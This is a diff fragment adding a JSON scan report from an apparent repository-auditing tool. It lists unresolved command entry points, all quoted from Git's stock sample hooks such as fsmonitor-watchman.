+        "before": {
+          "summary": {
+            "status": "incomplete",
+            "files": 21,
+            "findings": 5,
+            "unresolved": 425,
+            "unreadable": 0,
+            "exclusions": 4
+          },
+          "unreadable": [],
+          "exclusions": [
+            {
+              "path": "E:\\np-audit\\.git",
+              "reason": "Git metadata other than config, config.worktree, commondir and hooks is not analyzed"
+            },
+            {
+              "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\present\\.githooks",
+              "reason": "Explicit path exclusion"
+            },
+            {
+              "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\removed",
+              "reason": "Explicit path exclusion"
+            },
+            {
+              "path": "E:\\np-audit\\node_modules",
+              "reason": "Explicit path exclusion"
+            }
+          ],
+          "unresolved": [
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\applypatch-msg.sample",
+              "reason": "Referenced script target is missing",
+              "line": 12,
+              "evidence": ". git-sh-setup",
+              "evidenceTruncated": false,
+              "reference": "git-sh-setup",
+              "target": "E:\\np-audit\\git-sh-setup",
+              "status": "missing"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\applypatch-msg.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 13,
+              "evidence": "commitmsg=\"$(git rev-parse --git-path hooks/commit-msg)\"",
+              "evidenceTruncated": false,
+              "command": "rev-parse --git-path hooks/commit-msg)\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\applypatch-msg.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 14,
+              "evidence": "test -x \"$commitmsg\" && exec \"$commitmsg\" ${1+\"$@\"}",
+              "evidenceTruncated": false,
+              "command": "test -x \"$commitmsg\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\applypatch-msg.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 14,
+              "evidence": "test -x \"$commitmsg\" && exec \"$commitmsg\" ${1+\"$@\"}",
+              "evidenceTruncated": false,
+              "command": "exec \"$commitmsg\" ${1+\"$@\"}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\applypatch-msg.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 15,
+              "evidence": ":",
+              "evidenceTruncated": false,
+              "command": ":"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\commit-msg.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 20,
+              "evidence": "test \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |",
+              "evidenceTruncated": false,
+              "command": "test \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\commit-msg.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 21,
+              "evidence": "\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {",
+              "evidenceTruncated": false,
+              "command": "sort"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\commit-msg.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 21,
+              "evidence": "\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {",
+              "evidenceTruncated": false,
+              "command": "uniq -c"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\commit-msg.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 21,
+              "evidence": "\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {",
+              "evidenceTruncated": false,
+              "command": "sed -e '/^[ \t]*1[ \t]/d')\" || {"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\commit-msg.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 24,
+              "evidence": "}",
+              "evidenceTruncated": false,
+              "command": "}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 3,
+              "evidence": "use strict;",
+              "evidenceTruncated": false,
+              "command": "use strict"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 4,
+              "evidence": "use warnings;",
+              "evidenceTruncated": false,
+              "command": "use warnings"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 5,
+              "evidence": "use IPC::Open2;",
+              "evidenceTruncated": false,
+              "command": "use IPC::Open2"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 19,
+              "evidence": "my ($version, $last_update_token) = @ARGV;",
+              "evidenceTruncated": false,
+              "command": "my ($version, $last_update_token) = @ARGV"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 25,
+              "evidence": "if ($version ne 2) {",
+              "evidenceTruncated": false,
+              "command": "if ($version ne 2) {"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 26,
+              "evidence": "\tdie \"Unsupported query-fsmonitor hook version '$version'.\\n\" .",
+              "evidenceTruncated": false,
+              "command": "die \"Unsupported query-fsmonitor hook version '$version'./n\" ."
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 27,
+              "evidence": "\t    \"Falling back to scanning...\\n\";",
+              "evidenceTruncated": false,
+              "command": "\"Falling back to scanning.../n\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 28,
+              "evidence": "}",
+              "evidenceTruncated": false,
+              "command": "}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 30,
+              "evidence": "my $git_work_tree = get_working_dir();",
+              "evidenceTruncated": false,
+              "command": "my $git_work_tree = get_working_dir()"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 32,
+              "evidence": "my $retry = 1;",
+              "evidenceTruncated": false,
+              "command": "my $retry = 1"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 34,
+              "evidence": "my $json_pkg;",
+              "evidenceTruncated": false,
+              "command": "my $json_pkg"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 35,
+              "evidence": "eval {",
+              "evidenceTruncated": false,
+              "command": "eval {"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 36,
+              "evidence": "\trequire JSON::XS;",
+              "evidenceTruncated": false,
+              "command": "require JSON::XS"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 37,
+              "evidence": "\t$json_pkg = \"JSON::XS\";",
+              "evidenceTruncated": false,
+              "command": "$json_pkg = \"JSON::XS\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 38,
+              "evidence": "\t1;",
+              "evidenceTruncated": false,
+              "command": "1"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 39,
+              "evidence": "} or do {",
+              "evidenceTruncated": false,
+              "command": "} or do {"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 40,
+              "evidence": "\trequire JSON::PP;",
+              "evidenceTruncated": false,
+              "command": "require JSON::PP"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 41,
+              "evidence": "\t$json_pkg = \"JSON::PP\";",
+              "evidenceTruncated": false,
+              "command": "$json_pkg = \"JSON::PP\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 42,
+              "evidence": "};",
+              "evidenceTruncated": false,
+              "command": "}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 44,
+              "evidence": "launch_watchman();",
+              "evidenceTruncated": false,
+              "command": "launch_watchman()"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 46,
+              "evidence": "sub launch_watchman {",
+              "evidenceTruncated": false,
+              "command": "sub launch_watchman {"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 47,
+              "evidence": "\tmy $o = watchman_query();",
+              "evidenceTruncated": false,
+              "command": "my $o = watchman_query()"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 48,
+              "evidence": "\tif (is_work_tree_watched($o)) {",
+              "evidenceTruncated": false,
+              "command": "if (is_work_tree_watched($o)) {"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 49,
+              "evidence": "\t\toutput_result($o->{clock}, @{$o->{files}});",
+              "evidenceTruncated": false,
+              "command": "output_result($o->{clock}, @{$o->{files}})"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 50,
+              "evidence": "\t}",
+              "evidenceTruncated": false,
+              "command": "}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 51,
+              "evidence": "}",
+              "evidenceTruncated": false,
+              "command": "}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 53,
+              "evidence": "sub output_result {",
+              "evidenceTruncated": false,
+              "command": "sub output_result {"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 54,
+              "evidence": "\tmy ($clockid, @files) = @_;",
+              "evidenceTruncated": false,
+              "command": "my ($clockid, @files) = @_"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 62,
+              "evidence": "\tbinmode STDOUT, \":utf8\";",
+              "evidenceTruncated": false,
+              "command": "binmode STDOUT, \":utf8\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 63,
+              "evidence": "\tprint $clockid;",
+              "evidenceTruncated": false,
+              "command": "print $clockid"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 64,
+              "evidence": "\tprint \"\\0\";",
+              "evidenceTruncated": false,
+              "command": "print \"/0\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 65,
+              "evidence": "\tlocal $, = \"\\0\";",
+              "evidenceTruncated": false,
+              "command": "local $, = \"/0\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 66,
+              "evidence": "\tprint @files;",
+              "evidenceTruncated": false,
+              "command": "print @files"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 67,
+              "evidence": "}",
+              "evidenceTruncated": false,
+              "command": "}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 69,
+              "evidence": "sub watchman_clock {",
+              "evidenceTruncated": false,
+              "command": "sub watchman_clock {"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 70,
+              "evidence": "\tmy $response = qx/watchman clock \"$git_work_tree\"/;",
+              "evidenceTruncated": false,
+              "command": "my $response = qx/watchman clock \"$git_work_tree\"/"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 71,
+              "evidence": "\tdie \"Failed to get clock id on '$git_work_tree'.\\n\" .",
+              "evidenceTruncated": false,
+              "command": "die \"Failed to get clock id on '$git_work_tree'./n\" ."
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 72,
+              "evidence": "\t\t\"Falling back to scanning...\\n\" if $? != 0;",
+              "evidenceTruncated": false,
+              "command": "\"Falling back to scanning.../n\" if $? != 0"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 74,
+              "evidence": "\treturn $json_pkg->new->utf8->decode($response);",
+              "evidenceTruncated": false,
+              "command": "return $json_pkg->new->utf8->decode($response)"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 75,
+              "evidence": "}",
+              "evidenceTruncated": false,
+              "command": "}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 77,
+              "evidence": "sub watchman_query {",
+              "evidenceTruncated": false,
+              "command": "sub watchman_query {"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 78,
+              "evidence": "\tmy $pid = open2(\\*CHLD_OUT, \\*CHLD_IN, 'watchman -j --no-pretty')",
+              "evidenceTruncated": false,
+              "command": "my $pid = open2(\\*CHLD_OUT, \\*CHLD_IN, 'watchman -j --no-pretty')"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 79,
+              "evidence": "\tor die \"open2() failed: $!\\n\" .",
+              "evidenceTruncated": false,
+              "command": "or die \"open2() failed: $!/n\" ."
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 80,
+              "evidence": "\t\"Falling back to scanning...\\n\";",
+              "evidenceTruncated": false,
+              "command": "\"Falling back to scanning.../n\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 89,
+              "evidence": "\tmy $last_update_line = \"\";",
+              "evidenceTruncated": false,
+              "command": "my $last_update_line = \"\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 90,
+              "evidence": "\tif (substr($last_update_token, 0, 1) eq \"c\") {",
+              "evidenceTruncated": false,
+              "command": "if (substr($last_update_token, 0, 1) eq \"c\") {"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 91,
+              "evidence": "\t\t$last_update_token = \"\\\"$last_update_token\\\"\";",
+              "evidenceTruncated": false,
+              "command": "$last_update_token = \"\\\"$last_update_token\\\"\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 92,
+              "evidence": "\t\t$last_update_line = qq[\\n\"since\": $last_update_token,];",
+              "evidenceTruncated": false,
+              "command": "$last_update_line = qq[/n\"since\": $last_update_token,]"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 93,
+              "evidence": "\t}",
+              "evidenceTruncated": false,
+              "command": "}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 94,
+              "evidence": "\tmy $query = <<\"\tEND\";",
+              "evidenceTruncated": false,
+              "command": "my $query = <<\"\tEND\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 95,
+              "evidence": "\t\t[\"query\", \"$git_work_tree\", {$last_update_line",
+              "evidenceTruncated": false,
+              "command": "[\"query\", \"$git_work_tree\", {$last_update_line"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 96,
+              "evidence": "\t\t\t\"fields\": [\"name\"],",
+              "evidenceTruncated": false,
+              "command": "\"fields\": [\"name\"],"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 97,
+              "evidence": "\t\t\t\"expression\": [\"not\", [\"dirname\", \".git\"]]",
+              "evidenceTruncated": false,
+              "command": "\"expression\": [\"not\", [\"dirname\", \".git\"]]"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 98,
+              "evidence": "\t\t}]",
+              "evidenceTruncated": false,
+              "command": "}]"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 99,
+              "evidence": "\tEND",
+              "evidenceTruncated": false,
+              "command": "END"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 106,
+              "evidence": "\tprint CHLD_IN $query;",
+              "evidenceTruncated": false,
+              "command": "print CHLD_IN $query"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 107,
+              "evidence": "\tclose CHLD_IN;",
+              "evidenceTruncated": false,
+              "command": "close CHLD_IN"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 108,
+              "evidence": "\tmy $response = do {local $/; <CHLD_OUT>};",
+              "evidenceTruncated": false,
+              "command": "my $response = do {local $/"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 108,
+              "evidence": "\tmy $response = do {local $/; <CHLD_OUT>};",
+              "evidenceTruncated": false,
+              "command": "<CHLD_OUT>}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 115,
+              "evidence": "\tdie \"Watchman: command returned no output.\\n\" .",
+              "evidenceTruncated": false,
+              "command": "die \"Watchman: command returned no output./n\" ."
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 116,
+              "evidence": "\t\"Falling back to scanning...\\n\" if $response eq \"\";",
+              "evidenceTruncated": false,
+              "command": "\"Falling back to scanning.../n\" if $response eq \"\""
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 117,
+              "evidence": "\tdie \"Watchman: command returned invalid output: $response\\n\" .",
+              "evidenceTruncated": false,
+              "command": "die \"Watchman: command returned invalid output: $response/n\" ."
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 118,
+              "evidence": "\t\"Falling back to scanning...\\n\" unless $response =~ /^\\{/;",
+              "evidenceTruncated": false,
+              "command": "\"Falling back to scanning.../n\" unless $response =~ /^\\{/"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 120,
+              "evidence": "\treturn $json_pkg->new->utf8->decode($response);",
+              "evidenceTruncated": false,
+              "command": "return $json_pkg->new->utf8->decode($response)"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 121,
+              "evidence": "}",
+              "evidenceTruncated": false,
+              "command": "}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 123,
+              "evidence": "sub is_work_tree_watched {",
+              "evidenceTruncated": false,
+              "command": "sub is_work_tree_watched {"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 124,
+              "evidence": "\tmy ($output) = @_;",
+              "evidenceTruncated": false,
+              "command": "my ($output) = @_"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 125,
+              "evidence": "\tmy $error = $output->{error};",
+              "evidenceTruncated": false,
+              "command": "my $error = $output->{error}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 126,
+              "evidence": "\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {",
+              "evidenceTruncated": false,
+              "command": "if ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 127,
+              "evidence": "\t\t$retry--;",
+              "evidenceTruncated": false,
+              "command": "$retry--"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 128,
+              "evidence": "\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;",
+              "evidenceTruncated": false,
+              "command": "my $response = qx/watchman watch \"$git_work_tree\"/"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 129,
+              "evidence": "\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .",
+              "evidenceTruncated": false,
+              "command": "die \"Failed to make watchman watch '$git_work_tree'./n\" ."
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 130,
+              "evidence": "\t\t    \"Falling back to scanning...\\n\" if $? != 0;",
+              "evidenceTruncated": false,
+              "command": "\"Falling back to scanning.../n\" if $? != 0"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 131,
+              "evidence": "\t\t$output = $json_pkg->new->utf8->decode($response);",
+              "evidenceTruncated": false,
+              "command": "$output = $json_pkg->new->utf8->decode($response)"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 132,
+              "evidence": "\t\t$error = $output->{error};",
+              "evidenceTruncated": false,
+              "command": "$error = $output->{error}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 133,
+              "evidence": "\t\tdie \"Watchman: $error.\\n\" .",
+              "evidenceTruncated": false,
+              "command": "die \"Watchman: $error./n\" ."
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 134,
+              "evidence": "\t\t\"Falling back to scanning...\\n\" if $error;",
+              "evidenceTruncated": false,
+              "command": "\"Falling back to scanning.../n\" if $error"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 144,
+              "evidence": "\t\tmy $o = watchman_clock();",
+              "evidenceTruncated": false,
+              "command": "my $o = watchman_clock()"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 145,
+              "evidence": "\t\t$error = $output->{error};",
+              "evidenceTruncated": false,
+              "command": "$error = $output->{error}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 147,
+              "evidence": "\t\tdie \"Watchman: $error.\\n\" .",
+              "evidenceTruncated": false,
+              "command": "die \"Watchman: $error./n\" ."
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 148,
+              "evidence": "\t\t\"Falling back to scanning...\\n\" if $error;",
+              "evidenceTruncated": false,
+              "command": "\"Falling back to scanning.../n\" if $error"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 150,
+              "evidence": "\t\toutput_result($o->{clock}, (\"/\"));",
+              "evidenceTruncated": false,
+              "command": "output_result($o->{clock}, (\"/\"))"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 151,
+              "evidence": "\t\t$last_update_token = $o->{clock};",
+              "evidenceTruncated": false,
+              "command": "$last_update_token = $o->{clock}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 153,
+              "evidence": "\t\teval { launch_watchman() };",
+              "evidenceTruncated": false,
+              "command": "eval { launch_watchman() }"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 154,
+              "evidence": "\t\treturn 0;",
+              "evidenceTruncated": false,
+              "command": "return 0"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 155,
+              "evidence": "\t}",
+              "evidenceTruncated": false,
+              "command": "}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 157,
+              "evidence": "\tdie \"Watchman: $error.\\n\" .",
+              "evidenceTruncated": false,
+              "command": "die \"Watchman: $error./n\" ."
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 158,
+              "evidence": "\t\"Falling back to scanning...\\n\" if $error;",
+              "evidenceTruncated": false,
+              "command": "\"Falling back to scanning.../n\" if $error"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 160,
+              "evidence": "\treturn 1;",
+              "evidenceTruncated": false,
+              "command": "return 1"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 161,
+              "evidence": "}",
+              "evidenceTruncated": false,
+              "command": "}"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 163,
+              "evidence": "sub get_working_dir {",
+              "evidenceTruncated": false,
+              "command": "sub get_working_dir {"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 164,
+              "evidence": "\tmy $working_dir;",
+              "evidenceTruncated": false,
+              "command": "my $working_dir"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 165,
+              "evidence": "\tif ($^O =~ 'msys' || $^O =~ 'cygwin') {",
+              "evidenceTruncated": false,
+              "command": "if ($^O =~ 'msys'"
+            },
+            {
+              "path": "E:\\np-audit\\.git\\hooks\\fsmonitor-watchman.sample",
+              "reason": "Command entry point is not statically resolved",
+              "line": 165,
+              "evidence": "\tif ($^O =~ 'msys' || $^O =~ 'cygwin') {",
+              "evidenceTruncated": false,
